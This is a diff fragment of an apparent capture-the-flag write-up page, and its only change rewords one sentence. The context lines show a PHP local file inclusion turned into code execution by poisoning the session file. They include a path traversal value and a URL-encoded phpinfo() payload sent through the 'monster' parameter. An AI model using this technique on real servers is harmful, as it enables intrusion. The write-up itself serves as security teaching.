@@ -188,7 +188,7 @@ if (!doNotTrack) {
 <pre><code>GET /index.php?monster=sessions/sess\_{PHPSESSID}
 ...
 monster|s:34:&quot;../../../var/log/apache/access.log&quot;;
-</code></pre><p>This was the command I just made earlier. We can execute arbitrary PHP commands by making a request to the command we want to execute URL-encoded and then requesting the session file, for example if we want to execute <code>phpinfo()</code>:</p>
+</code></pre><p>This was content of the last request I made to the server. We can execute arbitrary PHP commands by making a request to the command we want to execute URL-encoded and then requesting the session file, for example if we want to execute <code>phpinfo()</code>:</p>
 <pre><code>GET /index.php?monster=%3c%3f%3d%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e
 ...
 GET /index.php?monster=sessions/sess\_{PHPSESSID}
